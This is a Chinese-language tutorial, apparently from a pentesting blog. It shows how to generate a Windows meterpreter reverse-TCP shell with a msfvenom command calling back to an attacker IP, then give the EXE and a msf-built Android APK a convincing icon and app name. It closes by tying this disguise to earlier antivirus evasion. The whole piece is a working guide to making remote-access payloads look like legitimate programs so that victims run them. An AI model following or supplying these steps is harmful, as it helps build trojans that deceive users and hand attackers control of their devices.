> 我们在利用`msf`和`cs`生成shell时。默认情况下生成的文件是没有图标的。这在实际中对我们后期的“肾透”十分不友好。本文将为你介绍下，如何添加图标！

# 修改EXE图标

`msf`和cs生成`shell`的结构不一样，因此我们无法用同一款工具进行修改。

#### 🎃修改msf shell图标

我们先生成一个shell

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.5.82 LPORT=5555
 -f exe -o 1.exe
```

修改图标，这里我们需要这样一款工具`QICON Changer`，他的使用也很简单，只需要将exe安装文件拖动到软件的左侧，然后把需要更换的图标移动到软件的右侧，然后按下`Apply`就可以了。

![](../Images/2d0a92eb73e6c2c0542caa39cecd7bf5.png)

#### 🚢修改cs图标

首先拖动 `exe` 到资源树这里，然后「右键」-「添加资源」-「Windows 标准类型」选择「图标」 然后名称随意填写（不为空就 OK）：

![](../Images/cf802b5a2bfff9b9649bd81027924f5b.png)![](../Images/0ffc915224d68715a46e17169e1090c8.png)

接着将上面准备的 `ico` 文件拖入到刚刚创建的图标中：

![](../Images/2a33aef11a38c8cb7672de482953f9f0.png)最后 `文件`—`另存为`即可保存带图标的 exe 程序了，就是这么简单。

![](../Images/61c9ab52af2f497a6c2a9d5a2a2c203a.png)

# 修改APP图标

默认情况下，`msf`生成的`Android` shell是默认的安卓图标。并且名字也是英文。来看看如何修改吧！首先我们需要反编译生成的`app`

```
apktool d bbskali
.apk
```

![](../Images/d75554c93f912f5612fa26ce122b37a4.png)先下载一个格式为png格式的图标。在`res`新建 `drawable` 将`png`格式图片放到里面

![](../Images/856a44ca775ec56a0ec5bd896564c957.png)

修改`AndroidManifest.xml`文件，打开文件在里面新添一句代码

```
<application android:icon="@drawable/icon" android:label="@string/app_name"
>
```

将原来的删除`application android:label="@string/app_name">`

![](../Images/4f4e158ff8b188c199d3bbeea483ffad.png)

打开文件文件，修改为你自己的名称`res-values-strings.xml`

![](../Images/b5966d9db7f18d2b4513c1140a985384.png)

最后汇编`app` 并签名

```
apktool b bbskali

```

![](../Images/d3bbf1ae6691ae45a60af8300ae37ba8.png)最后效果

![](../Images/1684683dc1062bef1c173b5e85cea450.png)

# 总结

通过对生成的`Shell`进行二次包装，再根据我们前期的免杀。这样能更好的达到伪装的效果，从而达到“肾透”的目标。
